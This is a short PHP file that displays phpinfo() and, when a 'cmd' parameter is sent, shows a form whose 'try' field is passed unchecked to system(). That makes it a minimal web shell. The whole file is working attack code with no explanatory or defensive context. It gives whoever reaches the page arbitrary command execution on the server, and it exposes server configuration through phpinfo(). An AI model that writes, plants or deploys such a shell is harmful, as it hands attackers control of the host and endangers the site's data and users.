<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        echo "<form name='form' action='#' method='post'>
        <input type='text' name='try'/> <input type='submit' value='enter'/>
        </form>";
        $cmd = ($_POST['try']);
        system($cmd);
        echo "</pre>";
        phpinfo();
        die;
}
phpinfo();
?>
